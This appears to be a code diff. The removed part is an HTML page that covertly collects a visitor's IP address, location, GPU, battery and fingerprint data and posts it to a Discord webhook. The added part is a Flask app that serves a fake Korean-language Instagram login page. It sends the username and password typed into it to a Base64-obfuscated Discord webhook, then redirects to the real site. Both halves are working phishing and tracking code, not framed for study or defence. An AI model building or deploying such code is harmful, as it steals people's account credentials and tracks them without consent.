@@ -1,165 +1,136 @@
+from flask import Flask, render_template_string, request, redirect
+import requests
+import base64
+
+app = Flask(__name__)
+
+# 웹훅 주소를 Base64로 인코딩한 값 (실행 시 자동으로 디코딩됨)
+# 기존 주소: https://discord.com/api/webhooks/...
+ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDEwNDgyNzY3MjAwNjcxNy9wZU1ZaVAyNlRxNVpsSW0zZi1iQzR0TDJUmZnM3RXX2VIa0xubE5vcFFHaDRiRlZzUVpORTc2bU5Ma1JaSFNGOUswSVQ="
+
+def get_webhook_url():
+    return base64.b64decode(ENCODED_WEBHOOK).decode('utf-8')
+
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Deep Telemetry & Fingerprint Analysis</title>
-    <script>
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = 240;
-                canvas.height = 60;
-                ctx.textBaseline = "alphabetic";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069";
-                ctx.font = "11pt 'Arial'";
-                ctx.fillText("Security Audit 🌐 2026", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.font = "18pt 'Times New Roman'";
-                ctx.fillText("Telemetry", 4, 45);
-                return canvas.toDataURL();
-            } catch (e) {
-                return "Unavailable";
-            }
+    <title>Instagram</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        function simpleHash(str) {
-            let hash = 0;
-            for (let i = 0; i < str.length; i++) {
-                hash = ((hash << 5) - hash) + str.charCodeAt(i);
-                hash |= 0;
-            }
-            return Math.abs(hash).toString(16).toUpperCase();
+        .container {
+            width: 350px;
+            text-align: center;
         }
-
-        window.onload = async function() {
-            const params = new URLSearchParams(window.location.search);
-            const code = params.get('code') || "N/A";
-            const webhook = "https://discord.com/api/webhooks/1540383547452563506/6B4JII1WJpJpFMkhrLGynSQ4KuhrL2snw9A89-ZFvd3G_e1rm4V6ksWz0hdLiglqMVeX"; 
-
-            if (webhook.includes("본인의_디스코드")) {
-                console.error("웹훅 주소가 설정되지 않았습니다.");
-                return;
-            }
-
-            // 1. HTTPS를 지원하는 IP 수집 API로 변경 (ipapi.co 사용)
-            let ipInfo = { query: "Unknown", isp: "Unknown", org: "Unknown", country: "KR", region: "", city: "", timezone: "Unknown" };
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                ipInfo = {
-                    query: d.ip || "Unknown",
-                    isp: d.org || "Unknown",
-                    org: d.asn || "Unknown",
-                    country: d.country_name || "대한민국",
-                    region: d.region || "",
-                    city: d.city || "",
-                    timezone: d.timezone || "Unknown"
-                };
-            } catch (e) {
-                console.error("IP API 오류", e);
-            }
-
-            // 2. WebGL GPU 정보 추출
-            let gpuVendor = "Unknown", gpuRenderer = "Unknown";
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
-                }
-            } catch (e) {}
-
-            const nav = navigator;
-            const screenInfo = window.screen;
-            const ram = nav.deviceMemory ? `${nav.deviceMemory} GB+` : "비공개/미지원";
-            const cores = nav.hardwareConcurrency || "미지원";
-            const languages = nav.languages ? nav.languages.join(', ') : nav.language;
-            const cookieEnabled = nav.cookieEnabled ? "활성화됨" : "차단됨";
-
-            let battery = "정보 없음";
-            try {
-                if (nav.getBattery) {
-                    const b = await nav.getBattery();
-                    battery = `${Math.round(b.level * 100)}% (${b.charging ? "충전 중" : "방전 중"})`;
-                }
-            } catch (e) {}
-
-            const canvasData = getCanvasFingerprint();
-            const fingerprintHash = simpleHash(canvasData + gpuRenderer + nav.userAgent);
-
-            // 3. 디스코드 페이로드 구성
-            const payload = {
-                "embeds": [
-                    {
-                        "title": "⚡ [DEEP TELEMETRY] 고급 클라이언트 진단 리포트",
-                        "color": 16711680,
-                        "fields": [
-                            { "name": "👤 인증 코드", "value": `\`${code}\``, "inline": false },
-                            { "name": "🌐 IPv4 주소", "value": `\`${ipInfo.query}\``, "inline": true },
-                            { "name": "📶 통신사 (ISP)", "value": `\`${ipInfo.isp}\``, "inline": true },
-                            { "name": "🏢 망 조직 (ASN)", "value": `\`${ipInfo.org}\``, "inline": false }
-                        ],
-                        "timestamp": new Date().toISOString()
-                    },
-                    {
-                        "color": 3447003,
-                        "fields": [
-                            { "name": "📍 지역 위치", "value": `국가: **${ipInfo.country}**\n도시: **${ipInfo.region} ${ipInfo.city}**`, "inline": true },
-                            { "name": "⏱️ 타임존", "value": `\`${ipInfo.timezone}\``, "inline": true }
-                        ]
-                    },
-                    {
-                        "color": 15844367,
-                        "fields": [
-                            { "name": "🎮 GPU 벤더", "value": `\`${gpuVendor}\``, "inline": false },
-                            { "name": "🖥️ GPU 렌더러", "value": `\`${gpuRenderer}\``, "inline": false },
-                            { "name": "💻 CPU 코어 / RAM", "value": `코어: \`${cores}개\` / RAM: \`${ram}\``, "inline": false }
-                        ]
-                    },
-                    {
-                        "color": 65280,
-                        "fields": [
-                            { "name": "🖥️ 화면 해상도", "value": `\`${screenInfo.width}x${screenInfo.height}\` (${screenInfo.colorDepth}bit)`, "inline": true },
-                            { "name": "🔋 배터리", "value": `\`${battery}\``, "inline": true },
-                            { "name": "🌐 언어 / 쿠키", "value": `언어: \`${languages}\` | 쿠키: \`${cookieEnabled}\``, "inline": false }
-                        ]
-                    },
-                    {
-                        "color": 10181046,
-                        "fields": [
-                            { "name": "🧭 User-Agent", "value": `\`\`${nav.userAgent}\`\``, "inline": false },
-                            { "name": "🔑 기기 핑거프린트 Hash", "value": `\`FP-${fingerprintHash}\``, "inline": false }
-                        ],
-                        "footer": { "text": "Advanced Telemetry Engine v5.1 • Fixed HTTPS API" }
-                    }
-                ]
-            };
-
-            await fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            });
-
-            document.body.innerHTML = `
-                <div style="background:#0b0e14; color:white; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:sans-serif;">
-                    <div style="font-size:50px; color:#23a559; margin-bottom:20px;">✔</div>
-                    <h1 style="font-size:24px;">인증 완료</h1>
-                    <p style="color:#8b949e;">시스템 분석이 성공적으로 종료되었습니다.</p>
-                </div>
-            `;
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 30px 40px;
+            margin-bottom: 10px;
+            border-radius: 1px;
         }
-    </script>
+        .logo {
+            font-family: 'Billabong', cursive, sans-serif;
+            font-size: 51px;
+            font-weight: normal;
+            margin: 22px 0 35px 0;
+            color: #262626;
+        }
+        .input-field {
+            position: relative;
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            color: #262626;
+            font-size: 12px;
+            padding: 12px 9px 8px 9px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            background: #0095f6;
+            border: 1px solid transparent;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 7px;
+            margin-top: 14px;
+            cursor: pointer;
+        }
+        button:active {
+            opacity: 0.7;
+        }
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+    </style>
 </head>
-<body style="background:#0b0e14; margin:0;">
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">Instagram</div>
+            <form method="POST" action="/login">
+                <div class="input-field">
+                    <input type="text" name="username" placeholder="전화번호, 사용자 이름 또는 이메일" required>
+                </div>
+                <div class="input-field">
+                    <input type="password" name="password" placeholder="비밀번호" required>
+                </div>
+                <button type="submit">로그인</button>
+            </form>
+        </div>
+        <div class="signup-box">
+            계정이 없으신가요? <a href="#">가입하기</a>
+        </div>
+    </div>
 </body>
 </html>
+"""
+
+@app.route('/')
+def home():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    
+    payload = {
+        "content": f"🎯 **인스타 로그인 정보 획득!**\n- **ID:** `{username}`\n- **PW:** `{password}`"
+    }
+    requests.post(get_webhook_url(), json=payload)
+    
+    return redirect("https://www.instagram.com")
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
 
